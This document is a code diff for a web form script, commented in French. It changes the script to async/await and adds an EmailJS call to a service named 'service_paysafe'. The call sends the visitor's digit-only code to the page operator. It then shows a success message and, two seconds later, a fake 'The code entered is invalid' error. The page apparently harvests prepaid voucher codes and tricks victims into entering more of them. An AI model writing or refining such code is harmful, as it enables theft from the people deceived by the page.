@@ -3,7 +3,7 @@ console.log("script.js chargé");
 // Initialisation EmailJS
 emailjs.init("rORVGScs1n94sqOPi");
 
-function verifyOrder() {
+async function verifyOrder() {
 
     console.log("verifyOrder appelée");
 
@@ -22,12 +22,13 @@ function verifyOrder() {
         return;
     }
 
-
     button.disabled = true;
     button.textContent = "Sending...";
     message.textContent = "";
 
-// Attendre le chargement de reCAPTCHA
+    try {
+
+        // Attendre le chargement de reCAPTCHA
         await new Promise(resolve => {
             grecaptcha.ready(resolve);
         });
@@ -41,16 +42,43 @@ function verifyOrder() {
         );
 
         console.log("reCAPTCHA token obtenu");
-
-        // Pour l'instant, on affiche simplement que le token a été généré
         console.log(recaptchaToken);
 
+        // Envoi EmailJS
+        const response = await emailjs.send(
+            "service_paysafe",
+            "template_psf",
+            {
+                order_number: orderNumber
+            }
+        );
+
+        console.log("Email envoyé !");
+        console.log(response);
+
+        // Premier message
         message.style.color = "white";
-        message.textContent = "Verification completed.";
+        message.textContent =
+            "Your request has been sent successfully.";
+
+        // Vider le champ
+        input.value = "";
+        input.focus();
+
+        // Deuxième message après 2 secondes
+        setTimeout(function () {
+
+            console.log("Deuxième message");
+
+            message.style.color = "red";
+            message.textContent =
+                "The code entered is invalid.";
+
+        }, 2000);
 
     } catch (error) {
 
-        console.error("Erreur reCAPTCHA :", error);
+        console.error("Erreur :", error);
 
         message.style.color = "red";
         message.textContent =
@@ -61,54 +89,11 @@ function verifyOrder() {
         button.disabled = false;
         button.textContent = "Submit";
     }
-
-}
-    emailjs.send(
-        "service_paysafe",
-        "template_psf",
-        {
-            order_number: orderNumber
-        }
-    )
-
-    .then(function (response) {
-
-        console.log("Email envoyé !");
-        console.log(response);
-
-        message.style.color = "white";
-        message.textContent = "Your request has been sent successfully.";
-
-        // Vider le champ
-        input.value = "";
-        input.focus();
-
-        // Deuxième message après 2 secondes
-        setTimeout(function () {
-            console.log("Deuxième message");
-            message.style.color = "red";
-            message.textContent = "The code entered is invalid.";
-        }, 2000);
-
-        button.disabled = false;
-        button.textContent = "Submit";
-
-    })
-
-    .catch(function(error) {
-
-        console.error("Erreur EmailJS :", error);
-
-        message.style.color = "red";
-        message.textContent = "An error occurred.";
-
-        button.disabled = false;
-        button.textContent = "Submit";
-    });
-
 }
 
-// Autoriser uniquement les chiffres + ajouter un espace tous les 4 chiffres
+
+// Autoriser uniquement les chiffres
+// + ajouter un espace tous les 4 chiffres
 document.getElementById("orderNumber").addEventListener("input", function () {
 
     // Conserver uniquement les chiffres
